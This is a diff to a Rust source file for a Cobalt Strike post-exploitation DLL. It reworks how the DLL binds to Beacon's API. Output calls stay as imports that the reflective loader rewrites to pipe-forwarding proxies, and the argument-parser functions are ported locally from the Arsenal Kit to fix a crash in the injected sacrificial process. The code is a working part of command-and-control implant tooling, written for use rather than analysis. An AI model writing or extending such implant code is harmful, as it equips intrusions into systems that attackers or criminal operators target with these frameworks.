@@ -1,16 +1,27 @@
-//! Cobalt Strike BeaconAPI imports for the postex DLL.
+//! Cobalt Strike BeaconAPI for the postex DLL.
 //!
-//! Unlike the old function-pointer-table approach (which guessed CS's
-//! internal BeaconAPI struct layout), this matches the Arsenal Kit
-//! `kits/postex/base` reference exactly: BeaconAPI functions are
-//! linked as ordinary DLL imports against `beacon.dll`. CS's reflective
-//! loader (smartinject) walks the IAT after image-load and rewrites any
-//! `beacon.dll` import to point at an in-process proxy that forwards the
-//! call to Beacon via the named pipe whose handle lives in
-//! `crate::pipes::G_PIPE_HANDLE`.
+//! BeaconAPI splits into two groups by mechanism:
 //!
-//! Only the functions we actually call are declared here. Adding more is
-//! free — just add the symbol to `beacon.def` and the `extern "C"` block.
+//! 1. **Smartinject-resolved imports** (declared `extern "C"` from
+//!    `beacon.dll`): functions that need cross-process state — output
+//!    delivery, token impersonation, admin check, pipe-side input.
+//!    CS's reflective loader rewrites the IAT entries to point at
+//!    in-process proxies that forward via `gPipeHandle`.
+//!
+//! 2. **Locally-implemented helpers** (plain Rust functions): pure
+//!    data-manipulation primitives that Arsenal Kit's `beacon.cpp`
+//!    statically links into every postex DLL — `BeaconDataParse`,
+//!    `BeaconDataInt`, `BeaconDataExtract`, `BeaconDataLength`. These
+//!    do NOT cross the process boundary; they walk the user-args
+//!    buffer in-place.
+//!
+//! Our v0.3.5 build mistakenly put group 2 into the import table.
+//! Smartinject doesn't resolve those names, so the IAT entries stayed
+//! unresolved and first call faulted the sacrificial. This version
+//! ports the C++ reference inline (see
+//! `arsenal-kit/kits/postex/base/beacon.cpp` lines 233-297).
+
+use core::ffi::c_void;
 
 /// Callback type for standard postex output. Beacon prints the bytes as-is.
 pub const CALLBACK_OUTPUT: i32 = 0x00;
@@ -18,21 +29,14 @@ pub const CALLBACK_OUTPUT: i32 = 0x00;
 /// client side.
 pub const CALLBACK_ERROR: i32 = 0x0d;
 
-/// `ExitFunc` value in POSTEX_ARGUMENTS that asks PostexExit to call
-/// `ExitProcess(0)` (default for fork-and-run sacrificials). Currently
-/// only `EXITFUNC_THREAD` is matched explicitly; anything else, including
-/// `EXITFUNC_PROCESS`, falls into the default ExitProcess path.
+/// `ExitFunc` value in POSTEX_ARGUMENTS for ExitProcess (default fork/run).
 #[allow(dead_code)]
 pub const EXITFUNC_PROCESS: u32 = 0x56A2B5F0;
-/// `ExitFunc` value in POSTEX_ARGUMENTS that asks PostexExit to call
-/// `ExitThread(0)` (set by CS when the postex job is injected into an
-/// existing remote process and the operator picked "thread" exit semantics).
+/// `ExitFunc` value in POSTEX_ARGUMENTS for ExitThread.
 pub const EXITFUNC_THREAD: u32 = 0x0A2A1DE0;
 
-/// Beacon's datap parser state — must match the layout in
-/// `arsenal-kit/kits/postex/base/beacon.h` exactly. Beacon implements
-/// `BeaconDataParse/Int/Extract` on the other side of the smartinject
-/// proxy; they walk this struct in-place.
+/// Beacon's data-parser state. Layout matches Arsenal Kit's
+/// `kits/postex/base/beacon.h::datap`.
 #[repr(C)]
 pub struct Datap {
     pub original: *mut i8,
@@ -43,45 +47,82 @@ pub struct Datap {
 
 unsafe extern "C" {
     /// Send a length-counted byte buffer to Beacon for display.
-    /// `ty` is one of the `CALLBACK_*` constants.
+    /// Smartinject-resolved.
     pub fn BeaconOutput(ty: i32, data: *const u8, len: i32);
 
-    /// printf-style output. We use it for short status lines.
+    /// printf-style output. Smartinject-resolved.
     pub fn BeaconPrintf(ty: i32, fmt: *const u8, ...);
-
-    /// Initialise `parser` against the user-args buffer. CS's bof_pack
-    /// emits a 4-byte total-size header before the packed fields;
-    /// BeaconDataParse consumes it so subsequent BeaconDataInt /
-    /// BeaconDataExtract calls see the field stream directly.
-    pub fn BeaconDataParse(parser: *mut Datap, buffer: *const u8, size: i32);
-
-    /// Pop the next `i` field.
-    pub fn BeaconDataInt(parser: *mut Datap) -> i32;
-
-    /// Pop the next `b` (or `z`) field and return its size via `*size`.
-    /// For `z` fields the returned bytes include the trailing NUL.
-    pub fn BeaconDataExtract(parser: *mut Datap, size: *mut i32) -> *mut u8;
-
-    /// Bytes remaining in the parser.
-    pub fn BeaconDataLength(parser: *mut Datap) -> i32;
 }
 
 /// Wrapper for `BeaconOutput` that accepts a Rust byte slice.
 ///
 /// # Safety
-/// Callers must hold the CS UDPK execution context — i.e. be called from
-/// the thread that received `DllEntryPoint(DLL_POSTEX_ATTACH)`. Calling
-/// before smartinject has rewritten the IAT (e.g. from `DLL_PROCESS_ATTACH`)
-/// will jump to the unresolved import stub and crash the sacrificial.
+/// Callers must be on the postex thread (i.e. inside DllEntryPoint(
+/// DLL_POSTEX_ATTACH)). Calling before smartinject has rewritten the
+/// IAT will jump to the unresolved import stub.
 #[inline]
 pub unsafe fn output(ty: i32, data: &[u8]) {
     unsafe { BeaconOutput(ty, data.as_ptr(), data.len() as i32) };
 }
 
-/// Force the linker to keep the `BeaconPrintf` IAT entry alive even though
-/// no Rust call site references it. Operators occasionally hot-load
-/// extensions to the runner that DO call it; if it isn't in the IAT,
-/// smartinject has nothing to rewrite and the call jumps into the
-/// fixed-up stub from libgcc. Costs 1 IAT slot (~24 bytes).
 #[used]
 static _BEACON_PRINTF_KEEPALIVE: unsafe extern "C" fn(i32, *const u8, ...) = BeaconPrintf;
+
+// ---------------------------------------------------------------------------
+// Local data-parser implementations (group 2). Ported from
+// `arsenal-kit/kits/postex/base/beacon.cpp` lines 233-297.
+//
+// IMPORTANT: bof_pack on the Sleep side stores integers in BIG-ENDIAN
+// (Java's network byte order). BeaconDataInt swaps to native LE.
+// ---------------------------------------------------------------------------
+
+/// Initialise the parser against `buffer`. The buffer is the
+/// user-args blob CS placed in `lpReserved`; `size` is from
+/// `gPostexArgumentsBuffer.UserArgumentBufferSize`.
+#[inline]
+pub unsafe fn beacon_data_parse(parser: &mut Datap, buffer: *const u8, size: i32) {
+    parser.original = buffer as *mut i8;
+    parser.buffer = buffer as *mut i8;
+    parser.size = size;
+    parser.length = size;
+}
+
+/// Pop a 4-byte big-endian integer (Sleep's `i` field).
+#[inline]
+pub unsafe fn beacon_data_int(parser: &mut Datap) -> i32 {
+    unsafe {
+        let raw = (parser.buffer as *const i32).read_unaligned();
+        parser.buffer = parser.buffer.add(4);
+        parser.length -= 4;
+        raw.swap_bytes()
+    }
+}
+
+/// Pop a length-prefixed buffer (Sleep's `z` and `b` fields). Returns
+/// a pointer into the buffer and writes the size out (if `out_size`
+/// non-null). For `z` fields the bytes include the trailing NUL.
+#[inline]
+pub unsafe fn beacon_data_extract(parser: &mut Datap, out_size: *mut i32) -> *const u8 {
+    unsafe {
+        let size = beacon_data_int(parser);
+        let p = parser.buffer as *const u8;
+        parser.buffer = parser.buffer.add(size as usize);
+        // beacon.cpp doesn't decrement length here — match its behaviour
+        // so BeaconDataLength reports remaining minus header counts only.
+        if !out_size.is_null() {
+            *out_size = size;
+        }
+        p
+    }
+}
+
+/// Remaining bytes in the parser.
+#[inline]
+#[allow(dead_code)]
+pub fn beacon_data_length(parser: &Datap) -> i32 {
+    parser.length
+}
+
+#[allow(non_camel_case_types)]
+#[allow(dead_code)]
+pub type c_void_t = c_void;
